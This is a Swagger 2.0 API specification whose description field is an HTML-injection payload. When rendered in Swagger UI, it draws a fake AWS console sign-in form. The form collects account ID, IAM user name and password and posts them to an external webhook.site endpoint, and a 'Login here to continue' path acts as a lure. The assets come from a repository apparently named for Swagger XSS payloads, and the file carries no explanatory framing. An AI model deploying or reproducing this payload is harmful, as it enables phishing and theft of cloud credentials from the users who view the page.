swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<table width="100%" cellspacing="0" cellpadding="14"><tr><td bgcolor="#232f3e" align="left"><img src="https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/assets/logo-aws.png" width="66" height="22" alt="aws"><font face="Segoe UI" size="3" color="#ffffff">&nbsp;|&nbsp; API Management Console</font></td></tr></table><br><br><table width="100%" cellspacing="0" cellpadding="0"><tr><td width="30%">&nbsp;</td><td width="40%" bgcolor="#ffffff"><table width="100%" cellspacing="0" cellpadding="22"><tr><td align="left"><font face="Arial" size="5" color="#16191f"><b>Sign in</b></font><br><font face="Segoe UI" size="2" color="#545b64">IAM user name</font><br><br><form action="https://webhook.site/REPLACE-ME" method="post"><font face="Segoe UI" size="1" color="#545b64">Account ID (12 digits)</font><br><input type="text" name="account" size="34" placeholder="123456789012"><br><br><font face="Segoe UI" size="1" color="#545b64">IAM user name</font><br><input type="text" name="user" size="34" placeholder="IAM user name"><br><br><font face="Segoe UI" size="1" color="#545b64">Password</font><br><input type="password" name="pass" size="34" placeholder="Password"><br><br><font face="Segoe UI" size="2" color="#0073bb">Forgot password?</font>&nbsp;&nbsp;<input type="image" src="https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/assets/btn-aws.png" width="110" height="31" alt="Sign in"></form></td></tr></table><table width="100%" cellspacing="0" cellpadding="3"><tr><td bgcolor="#232f3e">&nbsp;</td></tr></table><table width="100%" cellspacing="0" cellpadding="8"><tr><td align="left"><font face="Segoe UI" size="2" color="#8d99a8">API Management Console &mdash; us-east-1</font></td></tr></table></td><td width="30%">&nbsp;</td></tr></table><br>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
